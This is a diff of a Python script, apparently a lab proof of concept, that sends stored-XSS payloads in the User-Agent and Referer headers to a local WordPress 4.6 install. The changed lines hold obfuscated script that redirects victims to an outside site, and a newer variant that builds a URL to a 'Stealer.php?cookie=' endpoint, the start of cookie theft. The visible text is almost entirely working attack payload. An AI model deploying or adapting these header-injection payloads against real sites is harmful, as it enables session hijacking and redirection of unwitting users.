@@ -26,7 +26,8 @@ browser.submit()
 
 print ("# " + browser.title() + "\n")
 
-header = {'User-Agent': '"<iframe src=/></iframe>', 'Referer': '"<script>var a = /http:/ ; var b = /www.ansa.it/ ;window.location.replace((a+b).substr(1,18));</script>'}
+header = {'User-Agent': '"<iframe src=/></iframe>', 'Referer': '"<script>var a = /http:/; var b = /localhost:8888/; var c = /Stealer.php?cookie=/;var d = ((a+b).substr(1,21));alert((d+c).substr(0,41));</script>'}
+#header = {'User-Agent': '"<iframe src=/></iframe>', 'Referer': '"<script>var a = /http:/ ; var b = /www.ansa.it/ ;window.location.replace((a+b).substr(1,18));</script>'}
 url = "http://localhost:8888/WordPress-4.6/fakepage"
 
 # wrap the request. You can replace None with the needed data if it's a POST request
